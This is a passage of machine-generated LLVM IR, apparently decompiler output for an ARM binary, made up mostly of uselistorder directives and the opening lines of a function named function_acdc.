  uselistorder i32 %v4_a3e8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a3a8, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_a3a0, { 1, 2, 0 }
  uselistorder i32 %v4_a394, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_a320, { 1, 2, 0 }
  uselistorder i32 %v4_a31c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_a2fc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a2e4, { 1, 2, 0 }
  uselistorder i32 %v4_a2e0, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a2c8, { 1, 0 }
  uselistorder i32 %v2_a2c0, { 1, 2, 0 }
  uselistorder i32 %v4_a2bc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a280, { 2, 1, 0 }
  uselistorder i32 %v3_a274, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v3_a254, { 4, 5, 6, 7, 3, 1, 2, 0 }
  uselistorder i32* %v2_a254, { 1, 0 }
  uselistorder i32 %v0_a254, { 1, 0 }
  uselistorder i32 %v3_a23c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_a230, { 1, 2, 0 }
  uselistorder i32 %v0_a218, { 0, 2, 1 }
  uselistorder i32 %v3_a1f8, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 %storemerge74, { 1, 0 }
  uselistorder i32 %v3_a1d0, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 %v1_a1b0, { 1, 2, 0 }
  uselistorder i32 %v4_a1a4, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v3_a170, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_a168, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32 %v5_a13c, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_a11c, { 1, 0, 2 }
  uselistorder i32 %v1_a0f8, { 1, 2, 0 }
  uselistorder i32 %v4_a0f4, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_a0dc.v4_a0bc, { 1, 0, 2 }
  uselistorder i32 %v1_a09c, { 1, 2, 0 }
  uselistorder i32 %v4_a098, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a048, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v0_a044, { 1, 0 }
  uselistorder i32 %v0_a02c, { 1, 0 }
  uselistorder i32 %v0_a030, { 1, 0 }
  uselistorder i32 %v2_a00c, { 1, 0 }
  uselistorder i32 %v1_a008, { 3, 4, 2, 1, 6, 0, 7, 5, 8 }
  uselistorder i32 %v3_a004, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 %v0_9fd4, { 1, 0 }
  uselistorder i1 %v7_9f9c, { 0, 2, 1 }
  uselistorder i32 %v1_9fc0, { 1, 0 }
  uselistorder i32 %v2_9fbc, { 1, 0 }
  uselistorder i32 %v3_9fb8, { 0, 1, 4, 3, 6, 2, 7, 5, 8 }
  uselistorder i32 %v2_9fb0, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %v0_9fac, { 1, 0 }
  uselistorder i32 %v1_9f1c, { 1, 2, 0 }
  uselistorder i32 %v4_9f18, { 7, 6, 1, 4, 5, 3, 2, 8, 0, 10, 9, 11 }
  uselistorder i32 %v2_9f00, { 1, 0, 2 }
  uselistorder i32 %v2_9efc, { 1, 0, 2 }
  uselistorder i32 %v0_9ee0, { 0, 2, 1 }
  uselistorder i32 %v4_9ed8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_9eb4, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_9ea8, { 1, 2, 0 }
  uselistorder i32 %v4_9ea0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9e3c, { 1, 2, 0 }
  uselistorder i32 %v4_9e38, { 1, 2, 9, 4, 7, 8, 6, 5, 3, 0, 11, 10, 12 }
  uselistorder i32 %v2_9e20.v4_9e00, { 1, 0, 2 }
  uselistorder i32 %v1_9dd0, { 1, 2, 0 }
  uselistorder i32 %v4_9dcc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9d54, { 1, 2, 0 }
  uselistorder i32 %v4_9d50, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9d38.v4_9d18, { 1, 0, 2 }
  uselistorder i32 %v1_9cf4, { 1, 2, 0 }
  uselistorder i32 %v4_9cec, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9c6c, { 1, 2, 0 }
  uselistorder i32 %v4_9c68, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9c50.v4_9c30, { 1, 0, 2 }
  uselistorder i32 %v1_9c10, { 1, 2, 0 }
  uselistorder i32 %v4_9c0c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9be4, { 1, 2, 0 }
  uselistorder i32 %v4_9be0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9bbc, { 1, 2, 0 }
  uselistorder i32 %v4_9bb8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a66c, { 3, 7, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 %v1_9b70, { 1, 2, 0 }
  uselistorder i32 %v5_9b6c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_9b48, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i32 %v3_9ad0, { 0, 2, 1 }
  uselistorder i32 %v2_9ac4, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_9ab8, { 1, 0 }
  uselistorder i32 %v2_9aac, { 1, 0 }
  uselistorder i32 %v0_9aac, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_9aa4, { 1, 0 }
  uselistorder i32 %v1_9aac, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v3_9a88, { 1, 0, 2 }
  uselistorder i32 %v1_9a80, { 1, 0 }
  uselistorder i32 %v2_9a68, { 1, 0 }
  uselistorder i32 %v0_9a68, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_9a44, { 4, 2, 5, 3, 1, 0, 6 }
  uselistorder i32 %v2_99ac, { 1, 0 }
  uselistorder i32 %v1_99a8, { 2, 1, 4, 0, 5, 3, 6 }
  uselistorder i32 %v3_99a4, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %v2_984c, { 1, 0 }
  uselistorder i32 %v1_984c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_95d8, { 2, 1, 0 }
  uselistorder i32 %v3_95d4, { 1, 0 }
  uselistorder i32 %v1_95b4, { 1, 2, 0 }
  uselistorder i32 %v3_95b0, { 4, 1, 0, 2, 6, 5, 7, 3 }
  uselistorder i32 %v2_95a0, { 1, 0 }
  uselistorder i32 %v1_9598, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i1 %v7_9588, { 1, 0 }
  uselistorder i1 %v7_9580, { 1, 0 }
  uselistorder i32 %v1_9564, { 2, 1, 0 }
  uselistorder i32 %v3_9560, { 1, 0 }
  uselistorder i32 %v0_9564, { 1, 0 }
  uselistorder i32 %v2_9534, { 1, 0 }
  uselistorder i32 %v1_9534, { 1, 2, 4, 0, 3, 5 }
  uselistorder i32 %v0_9534, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_9530, { 0, 2, 1, 3 }
  uselistorder i32 %v0_951c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_94dc, { 1, 0 }
  uselistorder i32 %v2_94d4, { 1, 0 }
  uselistorder i32 %v1_94c8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_94b4, { 1, 0 }
  uselistorder i32 %v0_94b4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_94ac, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_94b4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v3_949c, { 1, 0 }
  uselistorder i32 %v3_9490, { 1, 0, 2 }
  uselistorder i32 %v0_944c, { 1, 0, 2 }
  uselistorder i32 %v1_93f0, { 1, 2, 0 }
  uselistorder i32 %v3_93ec, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_93c8, { 1, 2, 0 }
  uselistorder i32 %v3_93bc, { 0, 2, 1, 3 }
  uselistorder i32 %v4_93a8, { 1, 0 }
  uselistorder i8 %v3_93a8, { 16, 17, 18, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_93a8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9658, { 3, 4, 5, 1, 2, 0, 8, 7, 6 }
  uselistorder i32 %v2_9398, { 1, 0 }
  uselistorder i32 %v1_938c, { 2, 0, 3, 1, 4 }
  uselistorder i1 %v7_9368, { 1, 0 }
  uselistorder i32 %v1_9368, { 1, 0 }
  uselistorder i1 %v7_9360, { 1, 0 }
  uselistorder i32 %v4_9344, { 1, 0, 2 }
  uselistorder i1 %v7_9340, { 1, 0 }
  uselistorder i32 %v4_9324, { 1, 0, 2 }
  uselistorder i1 %v7_9320, { 1, 0 }
  uselistorder i1 %v7_9318, { 1, 0 }
  uselistorder i1 %v7_9310, { 1, 0 }
  uselistorder i32 %v2_9334, { 1, 0, 2, 3 }
  uselistorder i32 %v3_92ec253, { 1, 0 }
  uselistorder i32 %v5_92e8, { 1, 0 }
  uselistorder i8* %v1_9698, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_94a0, { 0, 21, 1, 20, 2, 23, 3, 22, 25, 4, 24, 5, 27, 6, 26, 7, 29, 8, 28, 9, 31, 10, 30, 11, 19, 34, 12, 33, 13, 35, 14, 17, 15, 18, 16, 36, 32 }
  uselistorder i32 %v2_9428, { 1, 0 }
  uselistorder i32 %v3_ac10, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-20856.0.ph, { 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 3, 68, 67, 4, 66, 65, 5, 63, 62, 6, 79, 78, 7, 77, 8, 76, 75, 9, 74, 73, 10, 72, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 17, 45, 44, 18, 43, 42, 19, 41, 40, 20, 39, 38, 21, 37, 22, 36, 35, 23, 34, 33, 24, 32, 31, 25, 30, 29, 26, 27, 58, 28 }
  uselistorder i32 %stack_var_-20872.0.ph, { 2, 1, 0 }
  uselistorder i32 %stack_var_-20860.0.ph, { 1, 0 }
  uselistorder i32 %v1_9258, { 1, 0 }
  uselistorder i32 %v0_9258, { 1, 0 }
  uselistorder i32 %v2_9218, { 1, 0 }
  uselistorder i32 %v8_91fc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_91dc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_9164, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v3_9108, { 2, 1, 4, 3, 0, 5, 6 }
  uselistorder i32 %v0_90f4, { 14, 0, 1, 15, 13, 28, 24, 2, 25, 23, 26, 11, 3, 4, 12, 10, 27, 8, 5, 6, 9, 7, 22, 21, 29, 18, 19, 20, 17, 16 }
  uselistorder i32 %v0_90e8, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i1 %v2_9078, { 1, 0, 2 }
  uselistorder i32 %v1_9074, { 0, 2, 1, 3 }
  uselistorder i32 %v2_9064, { 1, 0 }
  uselistorder i32 %v3_9060, { 0, 2, 4, 1, 5, 3, 6 }
  uselistorder i32 %v2_9058, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32* %v11_904c, { 1, 0, 2 }
  uselistorder i32 %v10_9048, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 34, 33, 32, 30, 29, 28, 31, 27, 26, 25, 12, 23, 22, 9, 8, 24, 7, 39, 38, 37, 36, 35, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_9040, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_9030, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_9020, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v1_9000, { 1, 0 }
  uselistorder i32 %v0_8ffc, { 1, 0, 3, 2 }
  uselistorder i8* %tmp200, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9, 10, 11 }
  uselistorder i32 %v2_8fd8, { 0, 17, 23, 24, 25, 26, 1, 20, 2, 21, 22, 27, 10, 11, 3, 16, 4, 18, 19, 28, 5, 15, 6, 29, 7, 14, 30, 8, 13, 31, 9, 12, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 %v5_8fd0, { 1, 0 }
  uselistorder i32 %v6_8f58, { 5, 4, 6, 2, 11, 0, 1, 10, 12, 9, 3, 8, 7, 13 }
  uselistorder i32 %v1_8f3c, { 1, 0 }
  uselistorder i32 %v1_8f30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40, 1, 41, 44, 42, 43 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 13, 14, 17, 18, 16, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 6, 5, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 11, 7, 8, 9, 10, 12, 13, 14, 15, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 46, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 123, 124, 125, 127, 126, 128, 129, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 115, 112, 113, 114, 116, 117, 120, 121, 118, 119, 122, 131, 130, 132, 133, 134, 135, 136, 141, 137, 138, 139, 140, 142, 144, 143, 3, 146, 145, 2, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 89, 90, 91, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 88, 85, 86, 118, 119, 92, 93, 94, 95, 96, 97, 98, 100, 99, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 1, 2, 151, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 3, 41, 42, 43, 44, 47, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 135, 136, 137, 138, 139, 140, 141, 59, 60, 61, 64, 62, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 130, 129, 131, 132, 134, 133, 170, 171, 142, 143, 144, 145, 146, 147, 148, 149, 150, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 169, 168, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 9, 10, 129, 13, 15, 14, 16, 18, 17, 20, 19, 22, 21, 23, 25, 24, 26, 29, 27, 28, 31, 30, 34, 32, 33, 36, 35, 37, 38, 40, 39, 41, 42, 43, 45, 44, 46, 48, 47, 50, 49, 51, 53, 52, 55, 54, 56, 58, 57, 60, 59, 61, 63, 62, 64, 67, 65, 66, 69, 68, 72, 70, 71, 74, 73, 76, 75, 78, 77, 80, 79, 81, 83, 82, 85, 84, 87, 86, 88, 89, 91, 90, 93, 92, 95, 94, 96, 98, 97, 99, 100, 101, 103, 102, 105, 104, 106, 108, 107, 109, 111, 110, 113, 112, 114, 115, 118, 116, 117, 119, 121, 120, 122, 124, 123, 126, 125, 127, 130, 128, 132, 131, 273, 272, 274, 276, 275, 8, 277, 134, 133, 135, 137, 136, 138, 139, 141, 140, 2, 142, 144, 143, 146, 145, 148, 147, 151, 149, 150, 153, 152, 154, 156, 155, 157, 5, 158, 160, 159, 162, 161, 163, 165, 164, 166, 168, 167, 169, 170, 172, 171, 174, 173, 175, 177, 176, 178, 180, 179, 181, 182, 184, 183, 186, 185, 187, 189, 188, 190, 192, 191, 193, 4, 194, 195, 196, 198, 197, 200, 199, 206, 201, 202, 292, 203, 204, 205, 208, 207, 209, 3, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 264, 263, 265, 266, 267, 268, 270, 269, 271, 278, 279, 281, 280, 283, 282, 285, 284, 288, 289, 287, 286, 297, 290, 291, 293, 295, 294, 296, 299, 298, 300, 7, 301, 303, 302, 304, 6, 1, 306, 305, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 320, 319, 322, 321, 324, 323, 11, 325, 327, 326, 328, 329, 330, 331, 332, 333, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 43, 44, 45, 34, 35, 36, 37, 38, 39, 0, 40, 41, 42 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 39, 40, 41, 42, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 56, 43, 44, 45, 46, 47, 48, 0, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 27, 26, 4, 5, 6, 7, 28, 29, 24, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 3, 25, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 137, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 63, 56, 57, 58, 59, 60, 61, 62, 118, 119, 120, 121, 122, 123, 124, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 114, 116, 115, 110, 111, 112, 113, 117, 150, 151, 152, 125, 126, 134, 135, 127, 128, 129, 130, 131, 132, 133, 136, 0, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 131, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 56, 57, 58, 59, 60, 61, 112, 113, 114, 115, 116, 117, 118, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 110, 109, 106, 107, 108, 111, 143, 144, 145, 119, 120, 128, 129, 121, 122, 123, 124, 125, 126, 127, 130, 0, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 134, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 56, 57, 58, 59, 60, 61, 115, 116, 117, 118, 119, 120, 121, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 113, 112, 107, 108, 109, 110, 114, 146, 147, 148, 122, 123, 131, 132, 124, 125, 126, 127, 128, 129, 130, 133, 0, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 144, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 65, 59, 60, 61, 62, 63, 64, 121, 122, 123, 124, 125, 126, 127, 66, 67, 68, 69, 71, 72, 70, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 117, 119, 118, 113, 114, 115, 116, 120, 162, 163, 164, 128, 129, 130, 140, 141, 131, 132, 133, 134, 135, 136, 137, 138, 139, 142, 143, 0, 147, 145, 146, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161 }
  uselistorder i32 ptrtoint (i32* @global_var_14338.105 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14328.100 to i32), { 0, 2, 1, 3 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14320.98 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1431c.96 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14314.94 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_142f4.82 to i32), { 0, 2, 1, 3 }
  uselistorder i8 7, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 20556, { 1, 0 }
  uselistorder i32 20684, { 2, 0, 1 }
  uselistorder i32 -20773, { 0, 4, 11, 5, 1, 7, 6, 2, 8, 3, 9, 10 }
  uselistorder i32 1464, { 1, 0 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 5, 2, 0, 1, 3, 4, 6, 7 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 37, { 0, 3, 1, 4, 5, 6, 7, 2, 8 }
  uselistorder i32 36, { 0, 3, 1, 4, 2, 5 }
  uselistorder [4 x i8]* @global_var_142fc.76, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_142fc.76 to i32), { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_aa74, { 1, 0 }
  uselistorder label %.thread73, { 1, 0 }
  uselistorder label %dec_label_pc_aa48, { 2, 0, 1 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %dec_label_pc_a88c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a76c, { 1, 0 }
  uselistorder label %.thread67, { 1, 0 }
  uselistorder label %dec_label_pc_a740, { 2, 0, 1 }
  uselistorder label %.thread64, { 1, 0 }
  uselistorder label %dec_label_pc_a5dc, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_a590, { 1, 0 }
  uselistorder label %dec_label_pc_a568, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a55c, { 1, 0 }
  uselistorder label %bb239, { 1, 0 }
  uselistorder label %bb237, { 1, 0 }
  uselistorder label %dec_label_pc_a3d0, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a344, { 1, 0 }
  uselistorder label %dec_label_pc_a218, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_a1f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a188, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a158, { 7, 2, 3, 1, 8, 4, 5, 0, 6 }
  uselistorder label %bb235, { 1, 0 }
  uselistorder label %dec_label_pc_9fdc, { 1, 0 }
  uselistorder label %dec_label_pc_9fd4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9fac, { 1, 0 }
  uselistorder label %dec_label_pc_9f6c, { 1, 0 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %bb229, { 1, 0 }
  uselistorder label %bb227, { 1, 0 }
  uselistorder label %dec_label_pc_9e7c, { 2, 1, 0 }
  uselistorder label %bb225, { 1, 0 }
  uselistorder label %.thread49, { 3, 0, 1, 2 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %.thread48, { 3, 0, 1, 2 }
  uselistorder label %bb219, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_9b78, { 1, 0 }
  uselistorder label %dec_label_pc_9aa0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9a24, { 1, 0 }
  uselistorder label %dec_label_pc_9a0c, { 1, 0 }
  uselistorder label %dec_label_pc_99d0, { 1, 0 }
  uselistorder label %dec_label_pc_995c, { 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_9664, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_9590, { 7, 8, 2, 9, 1, 10, 3, 11, 12, 13, 0, 15, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_9388, { 4, 1, 0, 2, 3, 5 }
  uselistorder label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_9294.dec_label_pc_9294_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_9280, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_9280.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_919c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb206, { 1, 0 }
  uselistorder label %bb204, { 1, 0 }
  uselistorder label %dec_label_pc_9054, { 1, 0 }
  uselistorder label %dec_label_pc_9010, { 1, 3, 4, 0, 2 }
}

define i32 @function_acdc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_acdc:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_acdc = urem i32 %arg1, 256
  %v2_ace0 = icmp eq i32 %v1_acdc, 0
  %v1_ace8 = urem i32 %arg3, 256
  br i1 %v2_ace0, label %dec_label_pc_ad2c, label %dec_label_pc_acf4

dec_label_pc_acf4:                                ; preds = %dec_label_pc_acdc
  %v0_acf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_acf4 = add i32 %v0_acf4, 4
